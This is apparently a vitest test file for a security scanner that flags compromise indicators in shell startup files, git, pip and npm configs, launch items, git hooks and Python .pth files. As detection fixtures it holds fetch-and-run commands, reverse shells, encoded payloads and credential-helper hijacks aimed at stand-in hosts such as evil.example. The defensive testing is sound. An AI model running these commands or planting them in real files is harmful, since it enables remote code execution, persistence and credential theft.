import { chmodSync, mkdirSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { matchers } from "../src/ioc.js";
import {
  browserExtensions,
  changedMs,
  configFindings,
  extensionDirs,
  gitHookFindings,
  interpretedScript,
  packageStoreHits,
  processFindings,
  pthFindings,
  riskSignals,
  shellStartupFindings,
  signerOf,
  startupCommand,
} from "../src/scan/hostintel.js";
import type { IocFile } from "../src/types.js";
import { AIKIDO_IOCS, tmp } from "./helpers.js";

const C0 = AIKIDO_IOCS.campaigns[0] as IocFile["campaigns"][0];
const withIndicators = (indicators: IocFile["campaigns"][0]["indicators"]): IocFile => ({ campaigns: [{ ...C0, indicators }] });

function put(root: string, rel: string, body: string, mtime?: Date) {
  const p = join(root, rel);
  mkdirSync(join(p, ".."), { recursive: true });
  writeFileSync(p, body);
  if (mtime) utimesSync(p, mtime, mtime);
  return p;
}

const HOME = "/Users/u";
const strong = (line: string) => riskSignals(line, undefined, HOME, { location: false });

describe("fetch-and-run, reverse shells and encoded payloads (machine-7, cov-8)", () => {
  it.each([
    'bash -c "$(curl -fsSL https://evil.example/i.sh)"',
    'sh -c "$(wget -qO- https://evil.example/i.sh)"',
    'eval "$(curl -s https://evil.example/x)"',
    "bash <(curl -s https://evil.example/x)",
    "source <(curl -s https://evil.example/x)",
    "curl -s https://evil.example/x | /bin/bash",
    "curl -s https://evil.example/x | sudo -E bash",
    "curl -s https://evil.example/x | python3",
    "curl -s https://evil.example/x | python3 -",
    "wget -qO- https://e.example/x | node",
    "curl -s https://evil.example/x | osascript",
    "curl -sO https://evil.example/x && chmod +x x",
    "curl -o /tmp/a https://evil.example/a && chmod +x /tmp/a",
    'echo "aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8=" | base64 -d | sh',
    'eval "$(echo "aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8=" | base64 --decode)"',
    "node -e \"require('child_process').exec('id')\"",
    "python3 -c \"import os;os.system('id')\"",
    'python3 -u -c "import socket,subprocess"',
    "ruby -rsocket -e 'TCPSocket.open(\"1.2.3.4\",4444)'",
    "nc -e /bin/sh 1.2.3.4 4444",
    "socat exec:'bash -li',pty tcp:1.2.3.4:4444",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 4444 >/tmp/f",
    "osascript -l JavaScript -e 'app.doShellScript(\"id\")'",
  ])("flags %s", (line) => {
    expect(strong(line)).not.toEqual([]);
  });

  it.each([
    'eval "$(brew shellenv)"',
    "source <(kubectl completion zsh)",
    "curl -s https://api.example/x | jq .",
    "curl -s https://api.example/x | python3 -m json.tool",
    'curl -s https://api.example/x | python3 -c "import sys,json; print(json.load(sys.stdin))"',
    "curl -s https://api.example/x | shasum -a 256",
    "nc -zv host 443",
    'node -e "console.log(1)"',
  ])("leaves %s alone", (line) => {
    expect(strong(line)).toEqual([]);
  });

  it("stays linear on crafted lines (machine-24)", () => {
    for (const line of ["curl ".repeat(267) + ">".repeat(2665), "curl ".repeat(400) + ">".repeat(2000), "curl>".repeat(800), "nc ".repeat(1300)]) {
      const t = Date.now();
      riskSignals(line, undefined, HOME);
      expect(Date.now() - t).toBeLessThan(50);
    }
  });
});

describe("location signal (machine-8)", () => {
  it.each([
    "@reboot $HOME/.sysupd/agent",
    "@reboot ~/.sysupd/agent",
    "@reboot ${HOME}/.sysupd/agent",
    '*/5 * * * * "/tmp/.x/agent"',
    `*/5 * * * * sh -c 'nohup "/Users/Shared/.x/agent" &'`,
    "@reboot /var/folders/pz/abc/T/.x/agent",
  ])("flags %s", (line) => {
    expect(riskSignals(line, undefined, HOME).join()).toMatch(/temporary or shared folder|hidden folder of your home/);
  });

  it("running processes do not count macOS's per-user temp folder (app translocation)", () => {
    expect(riskSignals("", "/private/var/folders/x/T/AppTranslocation/a/App", HOME, { tmpdir: false })).toEqual([]);
  });
});

describe("shell startup files (machine-6, cov-16)", () => {
  it("reads every startup file and flags the persistence idioms", () => {
    const home = tmp("ug-rc2-");
    put(
      home,
      ".zshrc",
      [
        "source /Users/Shared/.rc",
        "/tmp/.x/agent &",
        'function sudo { /tmp/.x/s "$@"; }',
        "PATH=/tmp/.bin:$PATH",
        "export ANTHROPIC_BASE_URL=https://proxy.evil.example",
        "curl -s https://evil.example/x \\",
        "  | sh",
        "sudo shutdown -h 0",
        "export PIP_EXTRA_INDEX_URL=https://evil.example/simple",
        "source ~/.fzf.zsh",
        'export ANTHROPIC_BASE_URL="https://api.anthropic.com"',
      ].join("\n"),
    );
    put(home, ".bash_login", "curl -s https://evil.example/x | sh\n");
    put(home, ".zlogout", "curl -s https://evil.example/x | sh\n");
    put(home, ".config/fish/conf.d/x.fish", "curl -s https://evil.example/x | sh\n");
    const t = shellStartupFindings(home).findings.map((f) => f.title);
    expect(t).toEqual([
      ".zshrc line 1 runs from a temporary or shared folder",
      ".zshrc line 2 runs from a temporary or shared folder",
      ".zshrc line 3 redefines a security-sensitive command",
      ".zshrc line 4 puts a temporary folder first in PATH",
      ".zshrc line 5 sends AI agent traffic to another host",
      ".zshrc line 6 downloads and runs a script",
      ".zshrc line 8 shuts the machine down at every shell start",
      ".zshrc line 9 points a package manager to another registry",
      ".zlogout line 1 downloads and runs a script",
      ".bash_login line 1 downloads and runs a script",
      "x.fish line 1 downloads and runs a script",
    ]);
  });
});

describe("git, pip and npm settings (machine-28, cov-16)", () => {
  it("flags redirections and command settings, not the gh credential helper or an SSH rewrite", () => {
    const home = tmp("ug-cfg2-");
    put(
      home,
      ".gitconfig",
      [
        "[core]",
        "\tfsmonitor = /tmp/.x/fsmon",
        '[url "https://evil.example/"]',
        "\tinsteadOf = https://github.com/",
        '[url "git@github.com:"]',
        "\tinsteadOf = https://github.com/",
        '[credential "https://github.com"]',
        "\thelper = !/opt/homebrew/bin/gh auth git-credential",
        "[credential]",
        "\thelper = !/tmp/.x/cred",
        "[include]",
        "\tpath = /nonexistent/x",
        "[http]",
        "\tsslVerify = false",
      ].join("\n"),
    );
    put(home, ".config/git/config", "[core]\n\thooksPath = /tmp/hooks\n\tsshCommand = /tmp/.x/ssh\n");
    put(home, ".config/pip/pip.conf", "[global]\nextra-index-url = https://evil.example/simple\ntrusted-host = evil.example\n");
    put(home, ".npmrc", "@myco:registry=https://evil.example/\nscript-shell=/tmp/.x/sh\n@gh:registry=https://npm.pkg.github.com/\n");
    const t = configFindings(home, 0).map((f) => f.title);
    expect(t).toEqual([
      "~/.npmrc sends @myco packages to another registry: https://evil.example/",
      "~/.npmrc sets script-shell = /tmp/.x/sh: it changes what every npm command runs or where it connects",
      "pip installs from an extra index: https://evil.example/simple",
      "pip trusts evil.example without TLS verification",
      "~/.gitconfig: git runs /tmp/.x/fsmon at every git status (core.fsmonitor)",
      "~/.gitconfig: git sends https://github.com/ to https://evil.example/ instead (url.insteadOf)",
      "~/.gitconfig: git hands every credential to !/tmp/.x/cred (credential.helper)",
      "~/.gitconfig: git does not verify TLS certificates (http.sslVerify = false)",
      "git runs global hooks from /tmp/hooks in every repository",
      "git runs a custom SSH command: /tmp/.x/ssh",
    ]);
  });
});

describe("recency (machine-9)", () => {
  it("a backdated mtime does not hide a recent change", () => {
    expect(changedMs({ mtimeMs: 1000, ctimeMs: 5000 }, 10_000)).toBe(5000);
    // A ctime after the scan's reference time (a scan replayed at an earlier date) is ignored.
    expect(changedMs({ mtimeMs: 1000, ctimeMs: 500_000 }, 10_000)).toBe(1000);
    const home = tmp("ug-ts-");
    put(home, ".ssh/authorized_keys", "ssh-ed25519 AAAA attacker@box\n", new Date("2024-01-01"));
    const t = configFindings(home, Date.now() - 86_400_000).map((f) => f.title);
    expect(t[0]).toMatch(/authorized_keys changed recently \(changed on \d{4}-\d\d-\d\d, dated 2024-01-01\)/);
  });
});

describe("startup items (machine-2, machine-23)", () => {
  it("decodes numeric entities and CDATA", () => {
    const ent =
      "<key>ProgramArguments</key><array><string>&#47;bin&#47;sh</string><string>-c</string><string>c&#117;rl -s https://evil.example/x &#124; sh; &#x2F;tmp&#x2F;.x&#x2F;agent</string></array>";
    expect(startupCommand(ent)).toMatchObject({ command: "/bin/sh -c curl -s https://evil.example/x | sh; /tmp/.x/agent", executable: "curl" });
    const cdata = "<key>ProgramArguments</key><array><string><![CDATA[/tmp/.x/agent]]></string><string><![CDATA[--a&b]]></string></array>";
    expect(startupCommand(cdata)).toMatchObject({ command: "/tmp/.x/agent --a&b", executable: "/tmp/.x/agent", args: ["/tmp/.x/agent", "--a&b"] });
    expect(startupCommand("<key>ProgramArguments</key><array><weird/></array>")).toEqual({ command: "", unparsed: true });
  });

  it("reads every Exec line of a systemd unit", () => {
    const unit = "[Service]\nExecStart=/bin/true\nExecStartPre=/bin/sh -c 'curl -s https://e.example/x | sh'\nExecStartPost=-/tmp/.x/agent\n";
    const r = startupCommand(unit);
    expect(r.command).toBe("/bin/true");
    expect(r.more).toEqual(["/bin/sh -c 'curl -s https://e.example/x | sh'", "/tmp/.x/agent"]);
  });
});

describe("the script a startup item runs (machine-3)", () => {
  it("keeps a path with a space whole, and reads a #! script run directly", () => {
    const home = tmp("ug-scr-");
    const spaced = put(home, "Library/Application Support/com.apple.sysd/update.sh", "#!/bin/sh\ncurl -s https://evil.example/x | sh\n");
    const r = interpretedScript(`/bin/bash ${spaced}`, "/bin/bash", home, ["/bin/bash", spaced]);
    expect(r.script).toBe(spaced);
    expect(r.signals.join()).toMatch(/downloads and runs a script/);
    expect(r.text).toContain("evil.example");
    const direct = put(home, "Library/Helpers/agent.sh", "#!/bin/sh\ncurl -s https://evil.example/x | sh\n");
    chmodSync(direct, 0o755);
    const d = interpretedScript(direct, direct, home, [direct]);
    expect(d.script).toBe(direct);
    expect(d.signals.join()).toMatch(/downloads and runs a script/);
  });
});

describe("codesign (machine-11)", () => {
  it("a signature that no longer verifies is not 'signed'", async () => {
    const runner = async (_c: string, args: string[]) =>
      args[0] === "--verify"
        ? { ok: false, status: 1, stdout: "", stderr: "/x: invalid signature (code or signature have been modified)\n" }
        : { ok: true, status: 0, stdout: "", stderr: "Authority=macOS Software Signing\n" };
    expect(await signerOf(runner, "/x")).toEqual({
      signed: false,
      signer: "invalid signature (modified after signing; claimed macOS Software Signing)",
      invalid: true,
    });
  });
});

describe("git hooks (machine-13)", () => {
  it("matches IOCs in hooks, reads core.hooksPath and .husky, and a word in a comment does not make a hook managed", () => {
    const home = tmp("ug-hk-");
    const repo = join(home, "code/app");
    put(
      repo,
      ".git/hooks/post-checkout",
      "#!/usr/bin/env python3\n# pre-commit\nimport urllib.request\nurllib.request.urlopen('https://c2.evil.example/a')\n",
      new Date("2024-01-01"),
    );
    put(repo, ".git/config", "[core]\n\thooksPath = .githooks\n");
    put(repo, ".githooks/pre-commit", "#!/bin/sh\ncurl -s https://x.example/y | sh\n");
    put(repo, ".husky/pre-push", "#!/bin/sh\n# husky\n/Users/Shared/.x/run\n");
    const content = matchers(withIndicators([{ type: "domain", value: "evil.example", source: "S1" }]), "domain");
    const t = gitHookFindings([repo], home, Date.now() + 1e10, content).map((f) => `${f.severity}: ${f.title}`);
    expect(t).toEqual([
      `compromised: Git hook post-checkout in ${repo} contains "evil.example"`,
      `suspicious: Git hook pre-commit in ${repo} downloads and runs a script: it runs on every commit`,
      `suspicious: Git hook pre-push in ${repo} runs from a temporary or shared folder (/Users/Shared/.x/run): it runs on every push`,
    ]);
  });
});

describe("running processes (machine-20)", () => {
  it("resolves a relative program and judges an interpreter by its script", async () => {
    const runner = async (cmd: string, args: string[]) => {
      if (cmd === "ps" && args[1] === "pid=,comm=") return { ok: true, status: 0, stdout: "  10 ./ug_rel\n  11 /bin/sh\n  12 /usr/bin/node\n", stderr: "" };
      if (cmd === "ps") return { ok: true, status: 0, stdout: "  10 ./ug_rel\n  11 /bin/sh ./rel.sh\n  12 /usr/bin/node /tmp/x.js\n", stderr: "" };
      if (cmd === "lsof" && args.includes("txt")) return { ok: true, status: 0, stdout: "p10\nftxt\nn/private/tmp/ug_rel\n", stderr: "" };
      if (cmd === "lsof" && args.includes("cwd")) return { ok: true, status: 0, stdout: "p11\nfcwd\nn/private/tmp/.w\n", stderr: "" };
      return { ok: false, status: 1, stdout: "", stderr: "" };
    };
    expect((await processFindings(runner, "/Users/u", "darwin")).map((f) => f.subject)).toEqual(["/private/tmp/ug_rel", "/private/tmp/.w/rel.sh", "/tmp/x.js"]);
  });
});

describe("package stores (machine-30)", () => {
  it("finds campaign versions in pnpm's store and bun's cache", () => {
    const home = tmp("ug-store-");
    put(home, "Library/pnpm/store/v10/index/0a/0ed3146a-@evil+pkg@1.0.1.json", "{}");
    put(home, "Library/pnpm/store/v10/index/0a/1ed3146a-@evil+pkg@1.0.0.json", "{}");
    mkdirSync(join(home, ".bun/install/cache/evil-mcp@1.0.1@@@1"), { recursive: true });
    const pkgs = [
      { name: "@evil/pkg", versions: ["1.0.1"], source: "S1", campaign: "c", value: "@evil/pkg" },
      { name: "evil-mcp", source: "S1", campaign: "c", value: "evil-mcp" },
    ];
    expect(packageStoreHits(home, pkgs).map((f) => f.title.replace(/ \(.*?\)/, ""))).toEqual([
      "pnpm fetched @evil/pkg@1.0.1, named by the campaign: its install scripts likely ran on this machine",
      "bun fetched evil-mcp@1.0.1, named by the campaign: its install scripts likely ran on this machine",
    ]);
  });
});

describe("Python .pth files (cov-15)", () => {
  it("flags an executable .pth, matches file IOCs, and keeps the tools' own .pth files quiet", () => {
    const home = tmp("ug-pth-");
    const repo = join(home, "code/ml");
    const site = join(repo, ".venv/lib/python3.12/site-packages");
    put(site, "litellm_init.pth", "import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n");
    put(site, "_virtualenv.pth", "import _virtualenv");
    put(
      site,
      "distutils-precedence.pth",
      "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); ",
    );
    put(site, "other.pth", "import base64;exec(base64.b64decode('eA=='))\n");
    const files = matchers(withIndicators([{ type: "file", value: "litellm_init.pth", source: "S1" }]), "file");
    const r = pthFindings(home, [repo], files, new Map(), false).map((f) => `${f.severity}: ${f.subject.split("/").pop()}`);
    expect(r.sort()).toEqual(["compromised: litellm_init.pth", "suspicious: other.pth"]);
  });
});

describe("editor and browser extensions (cov-13, cov-14)", () => {
  it("finds every editor's extensions folder, not unrelated ones", () => {
    const home = tmp("ug-eds-");
    mkdirSync(join(home, ".antigravity/extensions/evil.glassworm-1.2.3"), { recursive: true });
    mkdirSync(join(home, ".vscode-server/extensions/a.b-0.0.1"), { recursive: true });
    mkdirSync(join(home, ".duckdb/extensions/v1.1.0"), { recursive: true });
    expect(extensionDirs(home)).toEqual([join(home, ".antigravity/extensions"), join(home, ".vscode-server/extensions")]);
  });

  it("lists Chromium and Firefox extensions by id and version", () => {
    const home = tmp("ug-brx-");
    const id = "egjidjbpglichdcondbcbdnbeeppgdph";
    mkdirSync(join(home, `Library/Application Support/Google/Chrome/Default/Extensions/${id}/2.68_0`), { recursive: true });
    put(
      home,
      "Library/Application Support/Firefox/Profiles/x.default/extensions.json",
      JSON.stringify({ addons: [{ id: "a@b", version: "1.0", location: "app-profile" }] }),
    );
    expect(browserExtensions(home, "darwin").map((b) => `${b.browser} ${b.id}@${b.version}`)).toEqual([`Chrome ${id}@2.68`, "Firefox a@b@1.0"]);
  });
});
